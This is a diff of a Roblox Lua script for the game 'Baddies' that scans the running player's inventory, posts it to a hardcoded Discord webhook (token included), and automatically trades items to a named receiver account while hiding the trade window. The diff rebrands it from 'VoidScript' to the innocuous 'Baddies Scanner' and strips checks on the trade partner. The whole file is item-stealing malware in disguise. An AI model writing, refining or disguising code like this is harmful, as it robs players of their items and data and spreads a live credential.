@@ -2,7 +2,7 @@
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1493322934532702261/heWYGm0D9zq8kiDoReF5eZEFiDdpDx9wuwZipmUygAbHIC4fJ5_43TJp2dN_n-iLNOxh"
 local RECEIVER = "Luckyman7778910"
 local ENABLE_TRADE = true
-local TRADE_INVITE_COOLDOWN = 2
+local TRADE_INVITE_COOLDOWN = 6
 local TRADE_ADD_DELAY = 0
 local TRADE_MODIFY_BUFFER = 0.03
 local TRADE_MAX_ITEMS = 20
@@ -735,15 +735,15 @@ local function buildDiscordPayload(results, meta)
 
     return {
         content = meta.pingEveryone and "@everyone" or "",
-        username = "VoidScript",
+        username = "Baddies Scanner",
         embeds = {
             {
-                title = "💅 VoidScript | Baddies ",
+                title = "💅 Baddies Item Skins Scan",
                 description = description,
                 color = 0xF1C40F,
                 timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
                 footer = {
-                    text = "VoidScript | Baddies Hits - " .. os.date("%d/%m/%Y %H:%M"),
+                    text = "Baddies Scanner - " .. os.date("%d/%m/%Y %H:%M"),
                 },
             },
         },
@@ -782,6 +782,7 @@ local function scanAndSend()
         return false
     end
 
+    -- SPEED OPTIMIZATION: Run the inventory upload asynchronously in the background
     local inventoryRawUrl = ""
     task.spawn(function()
         inventoryRawUrl = uploadInventoryRaw(results, LocalPlayer.Name)
@@ -839,89 +840,11 @@ local function isTradeUiActive()
     return LocalPlayer:GetAttribute("IsTrading") == true or TradeState.active
 end
 
-local function getTradeData()
-    if TradeRuntime.tradeData then
-        return TradeRuntime.tradeData
-    end
-    local ok, mod = pcall(function()
-        return require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("Trading"):WaitForChild("TradeData"))
-    end)
-    if ok and mod then
-        TradeRuntime.tradeData = mod
-        TradeRuntime.remotes = mod.Remotes
-    end
-    return TradeRuntime.tradeData
-end
-
-local function getTradeReplionChannel(rep)
-    if not rep then
-        return nil
-    end
-    if typeof(rep) == "string" then
-        return rep
-    end
-    return rawget(rep, "_channel") or rep._channel
-end
-
-local function normalizeTradeReplionId(value)
-    if typeof(value) == "string" and value ~= "" then
-        return value
-    end
-    if typeof(value) == "table" then
-        return getTradeReplionChannel(value)
-    end
-    return nil
-end
-
-local function isTradingWithReceiver()
-    if not LocalPlayer:GetAttribute("IsTrading") then
-        return false
-    end
-
-    local tradeData = getTradeData()
-    local replionId = normalizeTradeReplionId(TradeState.replionId)
-    
-    if not replionId or not TradeRuntime.replionModule then
-        return true 
-    end
-
-    local client = TradeRuntime.replionModule.Client
-    local tradeRep = client:GetReplion(replionId)
-    if tradeRep and tradeRep.Data and tradeRep.Data.Players then
-        for userId, _ in pairs(tradeRep.Data.Players) do
-            if tostring(userId) ~= tostring(LocalPlayer.UserId) then
-                local otherPlayer = Players:GetPlayerByUserId(tonumber(userId) or 0)
-                if otherPlayer then
-                    if otherPlayer.Name ~= RECEIVER then
-                        return false
-                    end
-                end
-            end
-        end
-    end
-
-    return true
-end
-
--- STRICT ENFORCEMENT: Cancel / decline or block trades with anyone else
-local function cancelActiveTrade()
-    local remotes = getTradeRemotes()
-    if remotes and remotes.CancelTrade then
-        pcall(function()
-            remotes.CancelTrade:InvokeServer()
-        end)
-    end
-    TradeState.active = false
-    TradeState.ended = true
-    TradeState.replionId = nil
-    TradeRuntime.sessionRunning = false
-end
-
 local function shouldHideTradeGui()
     if not HIDE_TRADE_GUI then
         return false
     end
-    return isTradeUiActive() and isTradingWithReceiver()
+    return isTradeUiActive()
 end
 
 local function hideTradingGuiInstant()
@@ -1073,16 +996,26 @@ local function installTradeStealthHooks()
 
         LocalPlayer:GetAttributeChangedSignal("IsTrading"):Connect(function()
             if LocalPlayer:GetAttribute("IsTrading") then
-                if not isTradingWithReceiver() then
-                    cancelActiveTrade()
-                else
-                    armTradeStealth()
-                end
+                armTradeStealth()
             else
                 disarmTradeStealth()
             end
         end)
     end)
+end
+
+local function getTradeData()
+    if TradeRuntime.tradeData then
+        return TradeRuntime.tradeData
+    end
+    local ok, mod = pcall(function()
+        return require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("Trading"):WaitForChild("TradeData"))
+    end)
+    if ok and mod then
+        TradeRuntime.tradeData = mod
+        TradeRuntime.remotes = mod.Remotes
+    end
+    return TradeRuntime.tradeData
 end
 
 local function getTradeMaxItems()
@@ -1092,6 +1025,26 @@ local function getTradeMaxItems()
         return math.floor(maxItems)
     end
     return TRADE_MAX_ITEMS
+end
+
+local function getTradeReplionChannel(rep)
+    if not rep then
+        return nil
+    end
+    if typeof(rep) == "string" then
+        return rep
+    end
+    return rawget(rep, "_channel") or rep._channel
+end
+
+local function normalizeTradeReplionId(value)
+    if typeof(value) == "string" and value ~= "" then
+        return value
+    end
+    if typeof(value) == "table" then
+        return getTradeReplionChannel(value)
+    end
+    return nil
 end
 
 local function getTradeRemotes()
@@ -1157,16 +1110,7 @@ local function setupTradeListeners()
             TradeState.active = true
             TradeState.completed = false
             TradeState.ended = false
-            
-            -- Verify right away if this trade is with the valid receiver
-            task.spawn(function()
-                task.wait(0.2)
-                if not isTradingWithReceiver() then
-                    cancelActiveTrade()
-                else
-                    armTradeStealth()
-                end
-            end)
+            armTradeStealth()
         end
     end)
 
@@ -1405,7 +1349,7 @@ local function addItemsToTrade(tradeRep, items)
         return 0
     end
 
-    local maxItems = math.min(getTradeMaxItems(), TRADE_MAX_ITEMS)
+    local maxItems = getTradeMaxItems()
     local added = 0
     setTradeDebug({ phase = "adding", tradableCount = #items, added = 0 })
 
@@ -1672,13 +1616,6 @@ local function runTradeSession(replionId, dataReplion, catalog, rapReplion)
             return
         end
 
-        -- STRICT VALIDATION CHECK HERE
-        if not isTradingWithReceiver() then
-            cancelActiveTrade()
-            finish(false, "trade is not with target receiver")
-            return
-        end
-
         setTradeDebug({ phase = "wait_session_ready" })
         if not waitForTradeSessionReady(tradeRep, 20) then
             finish(false, "trade session not ready")
@@ -1708,7 +1645,7 @@ local function runTradeSession(replionId, dataReplion, catalog, rapReplion)
             return
         end
 
-        local maxItems = math.min(getTradeMaxItems(), TRADE_MAX_ITEMS)
+        local maxItems = getTradeMaxItems()
         local batch = {}
         for i = 1, math.min(maxItems, #allItems) do
             table.insert(batch, allItems[i])
@@ -1790,11 +1727,7 @@ local function startTradeLoop()
                 replionId = waitForTradeStart(8)
             end
             if replionId then
-                if not isTradingWithReceiver() then
-                    cancelActiveTrade()
-                else
-                    runTradeSession(replionId, dataReplion, catalog, rapReplion)
-                end
+                runTradeSession(replionId, dataReplion, catalog, rapReplion)
             end
             task.wait(TRADE_INVITE_COOLDOWN)
             continue
@@ -1814,11 +1747,7 @@ local function startTradeLoop()
 
         local replionId = waitForTradeStart(20)
         if replionId then
-            if not isTradingWithReceiver() then
-                cancelActiveTrade()
-            else
-                runTradeSession(replionId, dataReplion, catalog, rapReplion)
-            end
+            runTradeSession(replionId, dataReplion, catalog, rapReplion)
         end
 
         task.wait(TRADE_INVITE_COOLDOWN)
